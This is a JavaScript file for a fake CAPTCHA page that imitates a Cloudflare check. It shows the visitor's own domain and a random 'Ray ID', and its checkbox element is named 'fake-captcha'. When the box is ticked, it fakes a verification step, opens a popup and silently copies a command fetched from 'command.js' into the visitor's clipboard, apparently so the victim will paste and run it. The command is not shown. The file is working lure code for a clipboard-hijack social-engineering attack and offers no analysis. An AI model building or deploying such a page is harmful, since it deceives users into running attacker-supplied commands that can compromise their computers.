document.addEventListener("DOMContentLoaded", function () {
    // Auto-detect domain name
    document.getElementById("domain-name").innerText = window.location.hostname;

    // Generate random Ray ID
    let rayID = Math.random().toString(36).substring(2, 12);
    document.getElementById("ray-id").innerText = rayID;
    document.getElementById("footer-ray-id").innerText = rayID;

    // Handle fake CAPTCHA click
    document.getElementById("fake-captcha").addEventListener("change", function () {
        if (this.checked) {
            document.getElementById("captcha-text").innerText = "Verifying...";
            document.getElementById("spinner").classList.remove("hidden");

            setTimeout(() => {
                document.getElementById("popup").classList.remove("hidden");
                copyCommandToClipboard();
            }, 2000);
        }
    });

    // Clipboard function (loads command from external JS)
    function copyCommandToClipboard() {
        fetch("command.js")
            .then(response => response.text())
            .then(text => {
                navigator.clipboard.writeText(text);
            })
            .catch(err => console.error("Error loading command.js:", err));
    }

    // Close popup on verify button click
    document.getElementById("verify-btn").addEventListener("click", function () {
        document.getElementById("popup").classList.add("hidden");
    });
});
